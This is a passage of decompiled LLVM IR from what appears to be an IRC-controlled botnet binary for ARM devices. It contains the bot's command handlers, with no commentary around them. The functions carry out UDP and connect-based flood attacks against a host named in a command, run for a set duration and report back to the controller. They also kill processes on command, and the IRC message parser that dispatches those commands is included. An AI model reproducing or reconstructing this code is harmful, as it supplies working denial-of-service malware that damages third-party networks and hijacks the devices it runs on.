  br i1 %v2_8d38, label %dec_label_pc_8c20.lr.ph, label %dec_label_pc_8d44

dec_label_pc_8d44:                                ; preds = %dec_label_pc_8d00
  %v2_8d4c = ptrtoint i32* %stack_var_-1100 to i32
  store i32 %v0_8be4, i32* @r0, align 4
  store i32 %v2_8d4c, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_8d60 = call i32 @recv()
  %tmp38 = icmp slt i32 %v0_8d60, 1
  br i1 %tmp38, label %dec_label_pc_8d84, label %dec_label_pc_8d78

dec_label_pc_8d78:                                ; preds = %dec_label_pc_8d44
  %v7_8d80 = icmp slt i32 %v0_8d60, 20
  br i1 %v7_8d80, label %dec_label_pc_8d8c, label %dec_label_pc_8d84

dec_label_pc_8d84:                                ; preds = %dec_label_pc_8d78, %dec_label_pc_8d44
  %v1_8d88 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8d8c

dec_label_pc_8d8c:                                ; preds = %dec_label_pc_8d78, %dec_label_pc_8d84
  %v2_8d9c = add i32 %v13_8b08, -1084
  %v2_8da0 = add i32 %v2_8d9c, %v0_8d60
  %v3_8da8 = inttoptr i32 %v2_8da0 to i8*
  store i8 0, i8* %v3_8da8, align 1
  %v1_8db0 = add i32 %v13_8b08, -1
  %v2_8dc0 = add i32 %v1_8db0, %v0_8d60
  %v2_8dc4 = add i32 %v2_8dc0, -1084
  %v1_8dc8 = inttoptr i32 %v2_8dc4 to i8*
  %v2_8dc8 = load i8, i8* %v1_8dc8, align 1
  %v7_8dcc = icmp eq i8 %v2_8dc8, 10
  br i1 %v7_8dcc, label %dec_label_pc_8dfc, label %dec_label_pc_8dd4

dec_label_pc_8dd4:                                ; preds = %dec_label_pc_8d8c
  %v2_8df0 = load i8, i8* %v1_8dc8, align 1
  %v7_8df4 = icmp eq i8 %v2_8df0, 13
  br i1 %v7_8df4, label %dec_label_pc_8dfc, label %dec_label_pc_8e20

dec_label_pc_8dfc:                                ; preds = %dec_label_pc_8dd4, %dec_label_pc_8d8c
  store i8 0, i8* %v1_8dc8, align 1
  br label %dec_label_pc_8e20

dec_label_pc_8e20:                                ; preds = %dec_label_pc_8dd4, %dec_label_pc_8dfc
  %v1_8e24 = add i32 %v13_8b08, -2
  %v2_8e34 = add i32 %v1_8e24, %v0_8d60
  %v2_8e38 = add i32 %v2_8e34, -1084
  %v1_8e3c = inttoptr i32 %v2_8e38 to i8*
  %v2_8e3c = load i8, i8* %v1_8e3c, align 1
  %v7_8e40 = icmp eq i8 %v2_8e3c, 10
  br i1 %v7_8e40, label %dec_label_pc_8e70, label %dec_label_pc_8e48

dec_label_pc_8e48:                                ; preds = %dec_label_pc_8e20
  %v2_8e64 = load i8, i8* %v1_8e3c, align 1
  %v7_8e68 = icmp eq i8 %v2_8e64, 13
  br i1 %v7_8e68, label %dec_label_pc_8e70, label %dec_label_pc_8e94

dec_label_pc_8e70:                                ; preds = %dec_label_pc_8e48, %dec_label_pc_8e20
  store i8 0, i8* %v1_8e3c, align 1
  br label %dec_label_pc_8e94

dec_label_pc_8e94:                                ; preds = %dec_label_pc_8e48, %dec_label_pc_8e70
  %v4_8eb8 = call i32 @Send(i32 %v0_8be4, i32 ptrtoint ([25 x i8]* @global_var_1d03c.62 to i32), i32 %v2_8d4c)
  store i32 %v0_8be4, i32* @r0, align 4
  %v0_8ec0 = call i32 @close()
  store i32 %v0_8b24, i32* @r0, align 4
  %v0_8ec8 = call i32 @close()
  %v1_8ed0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8ed4

dec_label_pc_8ed4:                                ; preds = %dec_label_pc_8bbc, %dec_label_pc_8ba4, %dec_label_pc_8b3c, %entry, %dec_label_pc_8e94
  %v9_8ed8 = phi i32 [ 0, %dec_label_pc_8bbc ], [ %v0_8bac, %dec_label_pc_8ba4 ], [ %v0_8b94, %dec_label_pc_8b3c ], [ %v0_8b24, %entry ], [ %v1_8ed0, %dec_label_pc_8e94 ]
  ret i32 %v9_8ed8

; uselistorder directives
  uselistorder i8* %v1_8e3c, { 1, 0, 2 }
  uselistorder i8* %v1_8dc8, { 1, 0, 2 }
  uselistorder i32 %storemerge26, { 1, 0 }
  uselistorder i32* %v1_8d20, { 2, 0, 1 }
  uselistorder i32 %v1_8c78, { 1, 0 }
  uselistorder i32 %v2_8c0c, { 1, 0 }
  uselistorder i32 %v0_8be4, { 2, 3, 4, 1, 0, 6, 5 }
  uselistorder i32 %v0_8bac, { 1, 0 }
  uselistorder i32 %v0_8b94, { 1, 0 }
  uselistorder i32 %v0_8b24, { 1, 2, 3, 0 }
  uselistorder i32 %v13_8b08, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 -1084, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8ed4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8e94, { 1, 0 }
  uselistorder label %dec_label_pc_8e20, { 1, 0 }
  uselistorder label %dec_label_pc_8d8c, { 1, 0 }
  uselistorder label %dec_label_pc_8d00, { 1, 0 }
  uselistorder label %dec_label_pc_8c20, { 1, 0 }
}

define i32 @std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36592, i32* %stack_var_-4, align 4
  %v2_8eec = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8eec, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-68, align 4
  %v8_8f0c = icmp sgt i32 %arg3, 2
  br i1 %v8_8f0c, label %dec_label_pc_8f30, label %dec_label_pc_8f10

dec_label_pc_8f10:                                ; preds = %entry
  %v2_8f14 = load i32, i32* @global_var_30230.64, align 4
  %v4_8f24 = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_1d058.66 to i32), i32 %v2_8f14)
  %v1_8f2c = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8f30

dec_label_pc_8f30:                                ; preds = %entry, %dec_label_pc_8f10
  %v0_8f3c = call i32 @socket()
  %v2_8f4c = call i32 @__GI_time(i32* null)
  %v3_8f58 = load i32, i32* %stack_var_-68, align 4
  %v1_8f5c = add i32 %v3_8f58, 12
  %v1_8f60 = inttoptr i32 %v1_8f5c to i32*
  %v2_8f60 = load i32, i32* %v1_8f60, align 4
  store i32 %v2_8f60, i32* @r0, align 4
  %v1_8f68 = call i32 @atol(i32 %v2_8f60)
  %v1_8f78 = call i32 @mfork(i32 %arg2)
  %v2_8f80 = icmp eq i32 %v1_8f78, 0
  br i1 %v2_8f80, label %dec_label_pc_8f88, label %dec_label_pc_90f4

dec_label_pc_8f88:                                ; preds = %dec_label_pc_8f30
  %v2_8f8c = load i32, i32* @global_var_30230.64, align 4
  %v4_8fa4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1d088.68 to i32), i32 %v2_8f8c)
  %v3_8fa8 = load i32, i32* %stack_var_-68, align 4
  %v1_8fac = add i32 %v3_8fa8, 4
  %v1_8fb0 = inttoptr i32 %v1_8fac to i32*
  %v2_8fb0 = load i32, i32* %v1_8fb0, align 4
  %v1_8fb8 = call i32 @__GI_gethostbyname(i32 %v2_8fb0)
  %v2_8fc4 = ptrtoint i32* %stack_var_-52 to i32
  store i32 16, i32* @r2, align 4
  store i32 %v2_8fc4, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_8fd4 = call i32 @__GI_memset()
  %v1_8fdc = add i32 %v1_8fb8, 16
  %v2_8fdc = inttoptr i32 %v1_8fdc to i32*
  %v3_8fdc = load i32, i32* %v2_8fdc, align 4
  %v1_8fe0 = inttoptr i32 %v3_8fdc to i32*
  %v2_8fe0 = load i32, i32* %v1_8fe0, align 4
  %v2_8fe8 = ptrtoint i32* %stack_var_-48 to i32
  %v1_8ff0 = add i32 %v1_8fb8, 12
  %v2_8ff0 = inttoptr i32 %v1_8ff0 to i32*
  %v3_8ff0 = load i32, i32* %v2_8ff0, align 4
  store i32 %v3_8ff0, i32* @r2, align 4
  %v3_9000 = call i32 @bcopy(i32 %v2_8fe0, i32 %v2_8fe8, i32 %v3_8ff0)
  %v1_9008 = add i32 %v1_8fb8, 8
  %v2_9008 = inttoptr i32 %v1_9008 to i32*
  %v3_9008 = load i32, i32* %v2_9008, align 4
  %v3_9010 = urem i32 %v3_9008, 65536
  store i32 %v3_9010, i32* %stack_var_-52, align 4
  %v3_9020 = load i32, i32* %stack_var_-68, align 4
  %v1_9024 = add i32 %v3_9020, 8
  %v1_9028 = inttoptr i32 %v1_9024 to i32*
  %v2_9028 = load i32, i32* %v1_9028, align 4
  store i32 %v2_9028, i32* @r0, align 4
  %v1_9030 = call i32 @atol(i32 %v2_9028)
  %v2_90a0 = add i32 %v1_8f68, %v2_8f4c
  br label %dec_label_pc_9054

dec_label_pc_9054:                                ; preds = %dec_label_pc_90e4, %dec_label_pc_8f88
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8f88 ], [ %v1_90e8, %dec_label_pc_90e4 ]
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_90e4, label %dec_label_pc_9060

dec_label_pc_9060:                                ; preds = %dec_label_pc_9054
  store i32 %v0_8f3c, i32* @r0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1d0a8.70 to i32), i32* @r1, align 4
  store i32 50, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_9070 = call i32 @send()
  store i32 %v0_8f3c, i32* @r0, align 4
  store i32 %v2_8fc4, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_9084 = call i32 @connect()
  %v2_908c = call i32 @__GI_time(i32* null)
  %v3_90a4 = icmp ult i32 %v2_908c, %v2_90a0
  br i1 %v3_90a4, label %dec_label_pc_90dc, label %dec_label_pc_90ac

dec_label_pc_90ac:                                ; preds = %dec_label_pc_9060
  %v2_90b0 = load i32, i32* @global_var_30230.64, align 4
  %v4_90c8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_1d0ac.72 to i32), i32 %v2_90b0)
  store i32 %v0_8f3c, i32* @r0, align 4
  %v0_90d0 = call i32 @close()
  %v1_90d8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_90dc

dec_label_pc_90dc:                                ; preds = %dec_label_pc_9060, %dec_label_pc_90ac
  br label %dec_label_pc_90e4

dec_label_pc_90e4:                                ; preds = %dec_label_pc_9054, %dec_label_pc_90dc
  %stack_var_-20.0 = phi i32 [ %storemerge3, %dec_label_pc_9054 ], [ 0, %dec_label_pc_90dc ]
  %v1_90e8 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_9054

dec_label_pc_90f4:                                ; preds = %dec_label_pc_8f30
  ret i32 %v1_8f78

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v3_8ff0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_90e4, { 1, 0 }
  uselistorder label %dec_label_pc_90dc, { 1, 0 }
  uselistorder label %dec_label_pc_8f30, { 1, 0 }
}

define i32 @stop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 37148, i32* %stack_var_-4, align 4
  %v2_9118 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9118, i32* @fp, align 4
  %v0_9120 = load i32, i32* %r0.global-to-local, align 4
  %v2_9190 = icmp eq i32 %arg2, 0
  %v2_920414 = load i32, i32* @global_var_2b908.52, align 4
  %v3_920c16 = icmp eq i32 %v2_920414, 0
  br i1 %v3_920c16, label %dec_label_pc_9214, label %dec_label_pc_913c

dec_label_pc_913c:                                ; preds = %dec_label_pc_91f4, %entry
  %storemerge122 = phi i32 [ %v1_91f8, %dec_label_pc_91f4 ], [ 0, %entry ]
  %v12_921821 = phi i32 [ %v12_92182, %dec_label_pc_91f4 ], [ %v0_9120, %entry ]
  %v3_9140 = mul i32 %storemerge122, 4
  %v2_914c = load i32, i32* @global_var_30234.54, align 4
  %v2_9150 = add i32 %v2_914c, %v3_9140
  %v1_9154 = inttoptr i32 %v2_9150 to i32*
  %v2_9154 = load i32, i32* %v1_9154, align 4
  %v2_9158 = icmp eq i32 %v2_9154, 0
  br i1 %v2_9158, label %dec_label_pc_91f4, label %dec_label_pc_9160

dec_label_pc_9160:                                ; preds = %dec_label_pc_913c
  %v2_9178 = load i32, i32* %v1_9154, align 4
  store i32 %v2_9178, i32* @r4, align 4
  %v0_917c = call i32 @__libc_getpid()
  store i32 %v0_917c, i32* %r0.global-to-local, align 4
  %v0_9184 = load i32, i32* @r4, align 4
  %v9_9184 = icmp eq i32 %v0_9184, %v0_917c
  br i1 %v9_9184, label %dec_label_pc_91f4, label %dec_label_pc_918c

dec_label_pc_918c:                                ; preds = %dec_label_pc_9160
  br i1 %v2_9190, label %dec_label_pc_91cc, label %dec_label_pc_9198

dec_label_pc_9198:                                ; preds = %dec_label_pc_918c
  %v2_919c = load i32, i32* @global_var_30230.64, align 4
  store i32 %v0_9120, i32* %r0.global-to-local, align 4
  %v4_91c8 = call i32 @Send(i32 %v0_9120, i32 ptrtoint ([29 x i8]* @global_var_1d0d0.76 to i32), i32 %v2_919c)
  store i32 %v4_91c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_91cc

dec_label_pc_91cc:                                ; preds = %dec_label_pc_918c, %dec_label_pc_9198
  %v2_91dc = load i32, i32* @global_var_30234.54, align 4
  %v2_91e0 = add i32 %v2_91dc, %v3_9140
  %v1_91e4 = inttoptr i32 %v2_91e0 to i32*
  %v2_91e4 = load i32, i32* %v1_91e4, align 4
  store i32 %v2_91e4, i32* %r0.global-to-local, align 4
  %v0_91f0 = call i32 @kill()
  store i32 %v0_91f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_91f4

dec_label_pc_91f4:                                ; preds = %dec_label_pc_9160, %dec_label_pc_913c, %dec_label_pc_91cc
  %v12_92182 = phi i32 [ %v0_917c, %dec_label_pc_9160 ], [ %v12_921821, %dec_label_pc_913c ], [ %v0_91f0, %dec_label_pc_91cc ]
  %v1_91f8 = add i32 %storemerge122, 1
  %v2_9204 = load i32, i32* @global_var_2b908.52, align 4
  %v3_920c = icmp ult i32 %v1_91f8, %v2_9204
  br i1 %v3_920c, label %dec_label_pc_913c, label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_91f4, %entry
  %v12_9218.lcssa = phi i32 [ %v0_9120, %entry ], [ %v12_92182, %dec_label_pc_91f4 ]
  ret i32 %v12_9218.lcssa

; uselistorder directives
  uselistorder i32 %v1_91f8, { 1, 0 }
  uselistorder i32 %v3_9140, { 1, 0 }
  uselistorder i32 %storemerge122, { 1, 0 }
  uselistorder i32 %v0_9120, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 5, 4, 6, 0, 1 }
  uselistorder label %dec_label_pc_91f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_91cc, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 37432, i32* %stack_var_-4, align 4
  %v2_9234 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9234, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_9258 = call i32 @malloc(i32 9216)
  %v2_9268 = call i32 @__GI_time(i32* null)
  %v1_9278 = call i32 @mfork(i32 %arg2)
  %v2_9280 = icmp eq i32 %v1_9278, 0
  br i1 %v2_9280, label %dec_label_pc_9288, label %dec_label_pc_9454

dec_label_pc_9288:                                ; preds = %entry
  %v7_928c = icmp eq i32 %arg3, 2
  br i1 %v7_928c, label %dec_label_pc_92b4, label %dec_label_pc_9294

dec_label_pc_9294:                                ; preds = %dec_label_pc_9288
  %v2_9298 = load i32, i32* @global_var_30230.64, align 4
  %v4_92a8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([43 x i8]* @global_var_1d0f0.80 to i32), i32 %v2_9298)
  %v1_92b0 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_92b4

dec_label_pc_92b4:                                ; preds = %dec_label_pc_9288, %dec_label_pc_9294
  %v1_92b8 = add i32 %arg4, 8
  %v1_92bc = inttoptr i32 %v1_92b8 to i32*
  %v2_92bc = load i32, i32* %v1_92bc, align 4
  store i32 %v2_92bc, i32* @r0, align 4
  %v1_92c4 = call i32 @atol(i32 %v2_92bc)
  %v1_9304 = add i32 %arg4, 4
  %v1_9308 = inttoptr i32 %v1_9304 to i32*
  %v2_9308 = load i32, i32* %v1_9308, align 4
  %v3_9314 = call i32 @host2ip(i32 %arg2, i32 %v2_9308, i32 0)
  %v2_9334 = load i32, i32* @global_var_30230.64, align 4
  %v4_934c = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1d11c.82 to i32), i32 %v2_9334)
  %v2_9400 = add i32 %v1_92c4, %v2_9268
  %v2_9398 = ptrtoint i32* %stack_var_-44 to i32
  br label %dec_label_pc_9350

dec_label_pc_9350:                                ; preds = %dec_label_pc_9414, %dec_label_pc_92b4
  %stack_var_-36.0 = phi i32 [ %tmp, %dec_label_pc_92b4 ], [ %v1_9418, %dec_label_pc_9414 ]
  %v0_9350 = call i32 @random()
  %v0_9378 = call i32 @socket()
  %v1_9388 = icmp slt i32 %v0_9378, 0
  br i1 %v1_9388, label %dec_label_pc_93dc, label %dec_label_pc_9390

dec_label_pc_9390:                                ; preds = %dec_label_pc_9350
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %v0_9378, i32* @r0, align 4
  %v3_93ac = call i32 @ioctl(i32 %v0_9378, i32 21537, i32 %v2_9398)
  store i32 %v0_9378, i32* @r0, align 4
  store i32 %v1_9258, i32* @r1, align 4
  store i32 9216, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_93d0 = call i32 @sendto()
  store i32 %v0_9378, i32* @r0, align 4
  %v0_93d8 = call i32 @close()
  br label %dec_label_pc_93dc

dec_label_pc_93dc:                                ; preds = %dec_label_pc_9350, %dec_label_pc_9390
  %v7_93e4 = icmp slt i32 %stack_var_-36.0, 50
  br i1 %v7_93e4, label %dec_label_pc_9414, label %dec_label_pc_93e8

dec_label_pc_93e8:                                ; preds = %dec_label_pc_93dc
  %v2_93ec = call i32 @__GI_time(i32* null)
  %v3_9404 = icmp ult i32 %v2_93ec, %v2_9400
  br i1 %v3_9404, label %dec_label_pc_940c, label %dec_label_pc_9424

dec_label_pc_940c:                                ; preds = %dec_label_pc_93e8
  br label %dec_label_pc_9414

dec_label_pc_9414:                                ; preds = %dec_label_pc_93dc, %dec_label_pc_940c
  %stack_var_-36.1 = phi i32 [ %stack_var_-36.0, %dec_label_pc_93dc ], [ 0, %dec_label_pc_940c ]
  %v1_9418 = add i32 %stack_var_-36.1, 1
  br label %dec_label_pc_9350

dec_label_pc_9424:                                ; preds = %dec_label_pc_93e8
  %v2_9428 = load i32, i32* @global_var_30230.64, align 4
  %v4_9440 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_1d13c.84 to i32), i32 %v2_9428)
  store i32 %v0_9378, i32* @r0, align 4
  %v0_9448 = call i32 @close()
  %v1_9450 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %entry, %dec_label_pc_9424
  %v9_9458 = phi i32 [ %v1_9278, %entry ], [ %v1_9450, %dec_label_pc_9424 ]
  ret i32 %v9_9458

; uselistorder directives
  uselistorder i32 %v0_9378, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32 50, { 1, 2, 0 }
  uselistorder i32 (i32)* @atol, { 2, 1, 0 }
  uselistorder i32 (i32)* @mfork, { 1, 0 }
  uselistorder i32 9216, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9454, { 1, 0 }
  uselistorder label %dec_label_pc_9414, { 1, 0 }
  uselistorder label %dec_label_pc_93dc, { 1, 0 }
  uselistorder label %dec_label_pc_92b4, { 1, 0 }
}

define i32 @killsec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 38008, i32* %stack_var_-4, align 4
  %v2_9474 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9474, i32* @fp, align 4
  %v2_9490 = load i32, i32* bitcast ([2 x i8*]* @global_var_2703c.88 to i32*), align 4
  %tmp9 = inttoptr i32 %v2_9490 to i8*
  %v4_949c = call i32 @__GI_strcasecmp(i8* %tmp9, i32 %arg2)
  %v2_94a4 = icmp eq i32 %v4_949c, 0
  br i1 %v2_94a4, label %dec_label_pc_94ac, label %dec_label_pc_94bc

dec_label_pc_94ac:                                ; preds = %entry
  %v0_94b4 = call i32 @kill()
  br label %dec_label_pc_94d4

dec_label_pc_94bc:                                ; preds = %entry
  %v2_94c0 = load i32, i32* @global_var_30230.64, align 4
  %v4_94d0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([25 x i8]* @global_var_1d160.91 to i32), i32 %v2_94c0)
  br label %dec_label_pc_94d4

dec_label_pc_94d4:                                ; preds = %dec_label_pc_94ac, %dec_label_pc_94bc
  %storemerge = phi i32 [ %v4_94d0, %dec_label_pc_94bc ], [ %v0_94b4, %dec_label_pc_94ac ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_94d4, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp32 = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-1112 = alloca i32, align 4
  %stack_var_-1124 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_94ec = load i32, i32* @r4, align 4
  store i32 %v3_94ec, i32* %stack_var_-20, align 4
  store i32 38132, i32* %stack_var_-4, align 4
  %v16_94ec = ptrtoint i32* %stack_var_-20 to i32
  %v2_94f0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_94f0, i32* @fp, align 4
  store i8* %tmp, i8** %stack_var_-1124, align 4
  br label %dec_label_pc_951c

dec_label_pc_9510:                                ; preds = %dec_label_pc_9534
  %v1_9514 = add i32 %storemerge11, 1
  br label %dec_label_pc_951c

dec_label_pc_951c:                                ; preds = %entry, %dec_label_pc_9510
  %v3_9520 = phi i8* [ %tmp, %entry ], [ %v3_953c, %dec_label_pc_9510 ]
  %storemerge11 = phi i32 [ 0, %entry ], [ %v1_9514, %dec_label_pc_9510 ]
  %v4_9520 = ptrtoint i8* %v3_9520 to i32
  store i32 %v4_9520, i32* %r0.global-to-local, align 4
  %v3_9524 = call i32 @strlen(i8* %v3_9520)
  store i32 %v3_9524, i32* %r0.global-to-local, align 4
  %v3_952c = icmp ult i32 %storemerge11, %v3_9524
  br i1 %v3_952c, label %dec_label_pc_9534, label %dec_label_pc_951c.dec_label_pc_9550_crit_edge

dec_label_pc_951c.dec_label_pc_9550_crit_edge:    ; preds = %dec_label_pc_951c
  %v3_9558.pre = load i8*, i8** %stack_var_-1124, align 4
  br label %dec_label_pc_9550

dec_label_pc_9534:                                ; preds = %dec_label_pc_951c
  %v3_953c = load i8*, i8** %stack_var_-1124, align 4
  %v4_953c = ptrtoint i8* %v3_953c to i32
  %v2_9540 = add i32 %v4_953c, %storemerge11
  %v1_9544 = inttoptr i32 %v2_9540 to i8*
  %v2_9544 = load i8, i8* %v1_9544, align 1
  %v7_9548 = icmp eq i8 %v2_9544, 32
  br i1 %v7_9548, label %dec_label_pc_9550, label %dec_label_pc_9510

dec_label_pc_9550:                                ; preds = %dec_label_pc_9534, %dec_label_pc_951c.dec_label_pc_9550_crit_edge
  %v3_9558 = phi i8* [ %v3_9558.pre, %dec_label_pc_951c.dec_label_pc_9550_crit_edge ], [ %v3_953c, %dec_label_pc_9534 ]
  %v4_9558 = ptrtoint i8* %v3_9558 to i32
  %v2_955c = add i32 %v4_9558, %storemerge11
  %v3_9564 = inttoptr i32 %v2_955c to i8*
  store i8 0, i8* %v3_9564, align 1
  %v3_9568 = load i8*, i8** %stack_var_-1124, align 4
  %v4_9578 = ptrtoint i8* %v3_9568 to i32
  %v2_957c = add i32 %v4_9578, %storemerge11
  %v1_9580 = add i32 %v2_957c, 2
  %v5_9584 = inttoptr i32 %v1_9580 to i8*
  br label %dec_label_pc_95a0

dec_label_pc_9594:                                ; preds = %dec_label_pc_95b8
  %v1_9598 = add i32 %storemerge12, 1
  br label %dec_label_pc_95a0

dec_label_pc_95a0:                                ; preds = %dec_label_pc_9550, %dec_label_pc_9594
  %storemerge12 = phi i32 [ 0, %dec_label_pc_9550 ], [ %v1_9598, %dec_label_pc_9594 ]
  store i32 %storemerge12, i32* @r4, align 4
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %v3_95a8 = call i32 @strlen(i8* %arg2)
  store i32 %v3_95a8, i32* %r0.global-to-local, align 4
  %v0_95b0 = load i32, i32* @r4, align 4
  %v3_95b0 = icmp ult i32 %v0_95b0, %v3_95a8
  br i1 %v3_95b0, label %dec_label_pc_95b8, label %dec_label_pc_95a0.dec_label_pc_95d4_crit_edge

dec_label_pc_95a0.dec_label_pc_95d4_crit_edge:    ; preds = %dec_label_pc_95a0
  %.pre = add i32 %storemerge12, %tmp32
  %.pre26 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_95d4

dec_label_pc_95b8:                                ; preds = %dec_label_pc_95a0
  %v2_95c4 = add i32 %storemerge12, %tmp32
  %v1_95c8 = inttoptr i32 %v2_95c4 to i8*
  %v2_95c8 = load i8, i8* %v1_95c8, align 1
  %v7_95cc = icmp eq i8 %v2_95c8, 33
  br i1 %v7_95cc, label %dec_label_pc_95d4, label %dec_label_pc_9594

dec_label_pc_95d4:                                ; preds = %dec_label_pc_95b8, %dec_label_pc_95a0.dec_label_pc_95d4_crit_edge
  %v3_95e8.pre-phi = phi i8* [ %.pre26, %dec_label_pc_95a0.dec_label_pc_95d4_crit_edge ], [ %v1_95c8, %dec_label_pc_95b8 ]
  store i8 0, i8* %v3_95e8.pre-phi, align 1
  %v2_95f0 = load i8, i8* %v5_9584, align 1
  %v7_95f4 = icmp eq i8 %v2_95f0, 62
  br i1 %v7_95f4, label %dec_label_pc_95fc, label %dec_label_pc_9a30

dec_label_pc_95fc:                                ; preds = %dec_label_pc_95d4
  %v2_9600 = load i32, i32* @global_var_30230.64, align 4
  store i32 %v4_9578, i32* %r0.global-to-local, align 4
  %v4_960c = call i32 @__GI_strcasecmp(i8* %v3_9568, i32 %v2_9600)
  store i32 %v4_960c, i32* %r0.global-to-local, align 4
  %v2_9614 = icmp eq i32 %v4_960c, 0
  br i1 %v2_9614, label %dec_label_pc_961c, label %dec_label_pc_9a30

dec_label_pc_961c:                                ; preds = %dec_label_pc_95fc
  %v2_9620 = ptrtoint i32* %stack_var_-1112 to i32
  store i32 1024, i32* @r2, align 4
  store i32 %v2_9620, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_9630 = call i32 @__GI_memset()
  store i32 %v0_9630, i32* %r0.global-to-local, align 4
  %v1_9640 = add i32 %v2_957c, 3
  %v5_9644 = inttoptr i32 %v1_9640 to i8*
  br label %dec_label_pc_9660

dec_label_pc_9654:                                ; preds = %dec_label_pc_9678
  %v1_9658 = add i32 %storemerge13, 1
  br label %dec_label_pc_9660

dec_label_pc_9660:                                ; preds = %dec_label_pc_961c, %dec_label_pc_9654
  %storemerge13 = phi i32 [ 0, %dec_label_pc_961c ], [ %v1_9658, %dec_label_pc_9654 ]
  store i32 %storemerge13, i32* @r4, align 4
  store i32 %v1_9640, i32* %r0.global-to-local, align 4
  %v3_9668 = call i32 @strlen(i8* %v5_9644)
  store i32 %v3_9668, i32* %r0.global-to-local, align 4
  %v0_9670 = load i32, i32* @r4, align 4
  %v3_9670 = icmp ult i32 %v0_9670, %v3_9668
  br i1 %v3_9670, label %dec_label_pc_9678, label %dec_label_pc_9660.dec_label_pc_9694_crit_edge

dec_label_pc_9660.dec_label_pc_9694_crit_edge:    ; preds = %dec_label_pc_9660
  %.pre27 = add i32 %storemerge13, %v1_9640
  %.pre28 = inttoptr i32 %.pre27 to i8*
  br label %dec_label_pc_9694

dec_label_pc_9678:                                ; preds = %dec_label_pc_9660
  %v2_9684 = add i32 %storemerge13, %v1_9640
  %v1_9688 = inttoptr i32 %v2_9684 to i8*
  %v2_9688 = load i8, i8* %v1_9688, align 1
  %v7_968c = icmp eq i8 %v2_9688, 32
  br i1 %v7_968c, label %dec_label_pc_9694, label %dec_label_pc_9654

dec_label_pc_9694:                                ; preds = %dec_label_pc_9678, %dec_label_pc_9660.dec_label_pc_9694_crit_edge
